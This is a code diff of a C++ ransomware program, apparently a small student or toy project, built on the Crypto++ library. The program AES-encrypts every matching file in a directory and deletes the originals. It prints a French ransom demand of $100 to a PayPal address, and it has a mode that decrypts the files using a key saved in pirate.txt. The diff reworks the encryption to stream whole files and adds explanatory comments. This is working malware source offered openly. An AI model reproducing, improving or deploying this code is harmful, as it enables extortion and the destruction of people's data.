@@ -96,101 +96,52 @@ vector<string> getAllFilesInDir(const string &dirPath)
     return listOfFiles;
 }
 
-string getFileContent(string path)
+/*
+ * Crypt file (pathIn) content to a new file (pathOut) with key and IV
+ *
+ * Arguments
+ * 	pathIn : File path to crypt
+ *  pathOut: File path to write content
+ *  key: the key used to crypt
+ *  iv: the IV used to crypt
+ */
+string encryptionAES(string pathIn, string pathOut, byte key[16], byte iv[16])
 {
-    ifstream ifs(path);
-    string content((istreambuf_iterator<char>(ifs)),
-                   (istreambuf_iterator<char>()));
-    return content;
-}
-
-string encryptionAES(string message, byte key[16], byte iv[16])
-{
-
-    string cipher;
-    int messageLen = message.length();
-
-    /**Création des objets pour le chiffrement**/
-
-    //choisir l'algorithme de chiffrement
     AES::Encryption aesEncryption(key, AES::DEFAULT_KEYLENGTH);
-    //choisir le mode de chiffrement avec le vecteur d'initialisationm
     CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, iv);
 
-    //fixer la sortie et éventuellement le type de padding (par défaut c'est PKCS_PADDING)
-    StreamTransformationFilter encryptor(cbcEncryption, new StringSink(cipher));
-
-    //chiffrer le message
-    encryptor.Put(reinterpret_cast<const unsigned char *>(message.c_str()), message.length() + 1);
-    encryptor.MessageEnd();
-
-    return cipher;
+    FileSource f(pathIn.c_str(), true,
+                 new StreamTransformationFilter(cbcEncryption,
+                                                new FileSink(pathOut.c_str())));
 }
 
-string decryptionAES(string message, byte key[16], byte iv[16])
+/*
+ * Decrypt file (pathIn) content to a new file (pathOut) with key and IV
+ *
+ * Arguments
+ * 	pathIn : File path to decrypt
+ *  pathOut: File path to write content
+ *  key: the key used to crypt
+ *  iv: the IV used to crypt
+ */
+string decryptionAES(string pathIn, string pathOut, byte key[16], byte iv[16])
 {
-
-    string original;
-    int messageLen = message.length();
-
-    /**Création des objets pour le déchiffrement**/
-
-    //choisir l'algorithme de chiffrement
     AES::Decryption aesDecryption(key, AES::DEFAULT_KEYLENGTH);
-    //choisir le mode de chiffrement avec le vecteur d'initialisationm
     CBC_Mode_ExternalCipher::Decryption cbcDecryption(aesDecryption, iv);
 
-    //fixer la sortie et éventuellement le type de padding (par défaut c'est PKCS_PADDING)
-    StreamTransformationFilter decryptor(cbcDecryption, new StringSink(original));
-
-    //chiffrer le message
-    decryptor.Put(reinterpret_cast<const unsigned char *>(message.c_str()), message.size());
-    decryptor.MessageEnd();
-
-    return original;
+    FileSource f(pathIn.c_str(), true,
+                 new StreamTransformationFilter(cbcDecryption,
+                                                new FileSink(pathOut.c_str())));
 }
 
 /*
- * Encode a string using base64
+ * Save key and IV used to crypt into a file.
+ * Key and IV will be encoded with base64
+ * 
  * Arguments
- *  in: string to be encoded
- *
- * Returns
- *   string containing base64 encoded in string
+ *  key: the key used to crypt
+ *  iv: the IV used to crypt
  */
-string encoderBase64(string in)
-{
-    string out;
-
-    StringSource(in, true, new Base64Encoder(new StringSink(out), false));
-
-    return out;
-}
-
-/*
- * Decode a string using base64
- * Arguments
- *  in: string to be decoded
- *
- * Returns
- *   string containing base64 decoded in string
- */
-string decoderBase64(string in)
-{
-    string out;
-
-    StringSource(in, true, new Base64Decoder(new StringSink(out)));
-
-    return out;
-}
-
-void writeFile(string path, string content)
-{
-    ofstream out(path);
-    out << content;
-    out.close();
-}
-
 void saveOptions(byte key[16], byte iv[16])
 {
     string encodedKey, encodedIv;
@@ -208,6 +159,12 @@ void saveOptions(byte key[16], byte iv[16])
     out.close();
 }
 
+/*
+ * Get decrypt options from pirate.txt
+ * 
+ * Returns:
+ *  options: string[2] containing key and IV
+ */
 string *getOptions()
 {
     ifstream ifs(DIRECTORY + "/pirate.txt");
@@ -224,18 +181,15 @@ string *getOptions()
 
     StringSource ssk(encodedKey, true,
                      new HexDecoder(
-                         new StringSink(key)) // HexDecoder
-    );                                        // StringSource
-
+                         new StringSink(key)));
     StringSource ssv(encodedIv, true,
                      new HexDecoder(
-                         new StringSink(iv)) // HexDecoder
-    );                                       // StringSource
+                         new StringSink(iv)));
 
-    string *res = new string[2];
-    res[0] = key;
-    res[1] = iv;
-    return res;
+    string *options = new string[2];
+    options[0] = key;
+    options[1] = iv;
+    return options;
 }
 
 int main(int argc, char *argv[])
@@ -263,6 +217,7 @@ int main(int argc, char *argv[])
         }
     }
 
+    // Get file paths considering FILE_TYPES global variable
     vector<string> filesList = getAllFilesInDir(DIRECTORY);
 
     if (!DECRYPTION_MODE)
@@ -277,15 +232,14 @@ int main(int argc, char *argv[])
         // Generate random AES 128 Key
         rng.GenerateBlock(key, AES::DEFAULT_KEYLENGTH);
 
+        // For each file
         for (const auto &path : filesList)
         {
-            string content = getFileContent(path);
-
-            string encrypted = encryptionAES(content, key, iv);
-            string encryptedBase64Enc = encoderBase64(encrypted);
-
+            // Add .enc extension to current path
             string newPath = path + ".enc";
-            writeFile(newPath, encryptedBase64Enc);
+            // Crypt file into new file with .enc
+            encryptionAES(path, newPath, key, iv);
+            // remove old file
             remove(path.c_str());
         }
 
@@ -295,8 +249,10 @@ int main(int argc, char *argv[])
              << "une rançon de 100$ doit être payée sur le compte PayPal hacker@gmail.com "
              << "pour pouvoir récupérer vos données" << endl;
     }
+    // We are in decrypt mode
     else
     {
+        // Get options to decrypt and parse it
         string *options = getOptions();
 
         byte iv[16];
@@ -308,19 +264,17 @@ int main(int argc, char *argv[])
             iv[i] = options[1][i];
         }
 
+        // For each file
         for (const auto &path : filesList)
         {
-            string content = getFileContent(path);
-
-            string decoded = decoderBase64(content);
-            string derypted = decryptionAES(decoded, key, iv);
-
+            // Remove .enc extension
             string newPath = path.substr(0, path.length() - 4);
-
-            writeFile(newPath, derypted);
+            // Decrypt file into new file without .enc
+            decryptionAES(path, newPath, key, iv);
+            // Remove old file
             remove(path.c_str());
         }
-
+        // Remove pirate.txt file
         string piratePath = DIRECTORY + "/pirate.txt";
         remove(piratePath.c_str());
     }
